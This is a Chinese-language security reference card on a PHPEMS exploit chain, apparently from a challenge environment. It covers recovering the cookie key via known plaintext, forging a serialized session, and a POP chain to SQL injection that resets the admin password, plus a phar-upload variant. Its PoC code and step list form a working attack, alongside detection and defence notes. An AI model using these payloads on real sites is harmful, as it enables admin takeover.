---
id: web-php-deserialization-custom-session-cookie-known-plaintext-key-forge-sqli
title: PHPEMS 自定义 session cookie 已知明文还原 32 字节 key 伪造序列化会话：session::__destruct→pdosql→pepdo.exec 注入改管理员密码
type: scenario
domain: web
path: web/php/deserialization
technique: custom-session-cookie-key-recovery-object-injection-sqli
aliases:
- PHPEMS session 伪造
- 自定义 cookie 加密已知明文
- 密文减明文还原 key
- 逐字节加 key cookie
- session::__destruct SQL 注入
- PHPEMS 反序列化
- phar 触发 PHPEMS POP 链
tags:
- web
- php
- phpems
- deserialization
- object-injection
- session
- cookie
- known-plaintext
- sqli
- phar
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V564
  verified_at: '2026-11-12T07:54:09+08:00'
  notes: 已对照原文与25张图片逐张核对：encode/decode逐字节加减32字节CS、config.cls.php CS随机32位串、session::__construct→getSessionId→strings->decode→unserialize触发点、getClientIp信任CLIENT_IP/X-Forwarded-For/Remote_Addr、Set-Cookie双重urlencode密文与反序列化出的sessionid/sessionip/sessiontimelimit、sessionid为md5(getClientIp+print_r(_SERVER)+microtime+rand)、substr(密文,64,32)对应已知明文:"sessionip";s:9:"127.0.0.1";s:1（32字节覆盖全部key下标）、还原key=4b394f264dfcdc724a06b9b05c1e59ed、pepdo::exec对['sql']先prepare再execute且tablepre可注入、phar变体PicUrl→file_get_contents与GIF89a stub上传，均与正文/截图一致；未复跑exp，后台登录后RCE由同篇另一卡覆盖；affected_versions 原文未标注（题目环境），未设置。
---

## 一句话结论

PHPEMS 把 `exam_currentuser` 会话 Cookie 做成"serialize + 与固定 32 字节 `CS` 逐字节相加 + urlencode"的自制加密；由于 `sessionip` 字段的值来自可伪造的 `X-Forwarded-For`/`Client-IP` 等头、且序列化格式固定，攻击者用一段已知明文（如 `:"sessionip";s:9:"127.0.0.1";s:1`，恰好 32 字节）做"密文-明文"即可还原循环 key，进而加密任意序列化对象伪造会话；`session::__destruct → pdosql::makeUpdate → pepdo::exec` 的 POP 链把可控表名拼进 SQL（预处理只覆盖参数、不覆盖 SQL 文本）完成注入，直接改掉后台管理员密码后登录后台。

## 原理

- **自制 Cookie 加密**：`lib/strings.cls.php` 的 `encode()` 先 `serialize($info)`，然后 `for($i=0;$i<$il;$i++){ $p=$i%$kl; $info[$i]=chr(ord($info[$i])+ord($key[$p])); }`，最后 `urlencode`；`decode()` 做两次 `urldecode`、逐字节减 `key[$p]`、再 `unserialize`。`CS` 是 `config.cls.php` 中随机生成的 32 位字符串。
- **触发点**：`lib/session.cls.php` 的 `session::__construct()` 里 `sessionid = getSessionId()`；`getSessionId()` 对 Cookie `exam_currentuser` 调 `strings->decode()`，`decode()` 末尾 `unserialize()` 即对象注入入口。每次请求都会走到。
- **已知明文恢复 key**：序列化数组固定包含 `sessionid`（md5）、`sessionip`（`$this->ev->getClientIp()`）、`sessiontimelimit`（时间戳）。`getClientIp()` 依次信任 `HTTP_CLIENT_IP`、`HTTP_X_FORWARDED_FOR`、`REMOTE_ADDR`——前两者完全由请求头控制。取密文中覆盖 32 个连续位置的 32 字节（如 `substr($info,64,32)`，因为 `p=i%32` 任意连续 32 字节正好覆盖全部 key 下标），减去已知明文 `:"sessionip";s:9:"127.0.0.1";s:1`，得到完整 key（原文环境解出 `4b394f264dfcdc724a06b9b05c1e59ed`）。
- **伪造会话对象**：用还原的 key 对任意 `serialize` 数据编码（再 urlencode 两次）写入 Cookie。`session` 对象在脚本结束触发 `__destruct()`，其属性 `pdosql` 指向可控的 `pdosql` 对象，`pdosql::makeUpdate` 调 `pepdo::exec`；`exec()` 中 `prepare($sql['sql'])` 只把 SQL 文本中的占位符参数化，而 SQL 文本由 `tablepre` 等字段拼接，攻击者把 `tablepre` 设为 `x2_user set userpassword="<md5>" where username="peadmin";#--` 即可注入。
- **为什么预处理挡不住**：PDO prepare 保护的是"用户数据进入参数位"；当注入点位于表名/SQL 结构部分，SQL 文本本身已是攻击者可控并与预编译语句拼接，`prepare` 无效。
- **phar 变体（原文非预期路线）**：同一 POP 链可由 phar 触发——`app/weixin/controller/index.api.php` 在 `MsgType=image` 时对 XML 的 `PicUrl` 执行 `file_get_contents($picurl)`，伪协议 `phar://` 会触发 phar metadata 反序列化；上传点 `app/document/controller/fineuploader.api.php`（需注册登录）允许上传图片，生成 stub 为 `GIF89a<?php __HALT_COMPILER(); ?>` 的 phar 再改名 `.gif` 上传即可。
- **最终影响**：无需后台口令即可把 `peadmin` 密码改为 `123456`（`e10adc3949ba59abbe56e057f20f883e`），登录后台后可继续用后台功能 getshell。

## 触发条件

- PHPEMS 使用默认的自制 Cookie 会话机制（`CS` 为 32 字节且不保密），Cookie 中 `sessionip` 等字段来自可控请求头。
- 攻击者能获取一次合法会话 Cookie（匿名访问即可）以提取密文样本。
- 存在可被 `unserialize` 的 POP 链（session→pdosql→pepdo），且相关类在请求生命周期内已加载（原文只有一条链可用，其他类未加载）。
- 数据库连接可用（`pepdo::exec` 会建立连接并执行注入 SQL）。

## 利用步骤

1. 匿名访问目标，抓取响应 `Set-Cookie: exam_currentuser=...`（双重 urlencode 的密文）。
2. 在密文中取任意连续 32 字节（如偏移 64），用已知明文 `:"sessionip";s:9:"127.0.0.1";s:1` 做逐字节差，还原 32 字节 key。
3. 构造恶意对象：`session` 对象属性 `sessionid`、`pdosql`（`tablepre` 为注入 SQL）、`db`（`pepdo`），序列化后用 key 逐字节加、urlencode 两次，替换 Cookie。
4. 发送请求触发 `session::__destruct` → `pdosql::makeUpdate` → `pepdo::exec`，UPDATE `x2_user` 把 `peadmin` 密码改为 `123456`。
5. 用 `peadmin/123456` 登录后台。
6. （变体）phar 路线：生成 GIF89a stub 的 phar（metadata 为同一恶意对象）改 `.gif`，注册用户后用 fineuploader 上传；请求 `?weixin-api` 且 XML `PicUrl=phar://<上传路径>` 触发。

## PoC

```php
<?php
// 1) 已知明文还原 key（$info 为从目标 Cookie 取出的密文，先两次 urldecode）
$info = urldecode(urldecode($info));
$info = substr($info, 64, 32);
function reverse($cipher, $plain) {
    $key = ''; $kl = 32;
    for ($i = 0; $i < strlen($cipher); $i++) {
        $key .= chr(ord($cipher[$i]) - ord($plain[$i % $kl]));
    }
    return $key;
}
$key = reverse($info, ':"sessionip";s:9:"127.0.0.1";s:1');

// 2) 用 key 编码任意序列化对象
function encode_with_key($data, $key) {
    $s = serialize($data); $kl = strlen($key);
    for ($i = 0; $i < strlen($s); $i++) {
        $s[$i] = chr(ord($s[$i]) + ord($key[$i % $kl]));
    }
    return urlencode($s);
}
?>
```

```php
<?php
namespace PHPEMS {
    class session {
        public function __construct() {
            $this->sessionid = "1111111";
            $this->pdosql = new pdosql();
            $this->db = new pepdo();
        }
    }
    class pdosql {
        private $db;
        public function __construct() {
            $this->tablepre = 'x2_user set userpassword="e10adc3949ba59abbe56e057f20f883e" where username="peadmin";#--';
            $this->db = new pepdo();
        }
    }
    class pepdo { private $linkid = 0; }
}
namespace {
    $session = new \PHPEMS\session();
    $array = array("sessionid" => "123123123", $session);
    // 用还原的 key 对 serialize($array) 逐字节加后 urlencode 两次，写入 exam_currentuser
}
```

phar 变体关键片段：

```php
$phar = new Phar('111.phar');
$phar->startBuffering();
$phar->setStub("GIF89a<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($session);
$phar->addFromString("foo.txt", "bar");
$phar->stopBuffering();
// copy 111.phar 111.gif 后经 fineuploader 上传；PicUrl=phar://<路径> 触发
```

## 变体与关联

- phar 触发：[[web-php-deserialization-phar-gif8-stub-inner-php-suffix-bypass]]、[[web-php-deserialization-phar-read-uploaded-image-pop-chain]]（GIF stub/上传图片触发 phar 的通用手法）；本卡只记录"同一 POP 链的第二种触发入口"（weixin PicUrl → file_get_contents）。
- 同类对象注入：[[web-php-deserialization-destruct-session-balance-forge]]（session __destruct 改业务数据）、[[web-php-deserialization-destruct-tostring-set-invoke-pop-system]]（魔术方法 POP 到 system）。
- 变体：若 `CS` 真随机且不可控明文字段不存在，需换泄露途径；若 `sessionip` 不写入序列化数据，可用 `sessiontimelimit` 时间戳做已知明文（但要注意时区/精度）。
- 边界：PHP 版本/类加载顺序导致 POP 链不可用、Cookie 改由服务端会话或签名保护、`getClientIp` 不信任 `X-Forwarded-For` 时，已知明文可控性下降。

## 检测与防御

- **检测**：`exam_currentuser` Cookie 双重 urlencode 且含非 ASCII 字节；同一 Cookie 中 `sessionip` 与实际来源 IP 不一致；SQL 日志出现 `UPDATE x2_user SET userpassword=...`；后台管理员口令被改为弱口令。
- **防御**：会话 Cookie 使用签名（HMAC）或服务端存储，禁止自制"加密"；绝不 `unserialize` 客户端数据（用 JSON）；`getClientIp` 仅在可信代理后才信任转发头；SQL 表名/结构白名单，禁止拼接；管理员强口令与二次认证；升级 PHPEMS 修复版本。
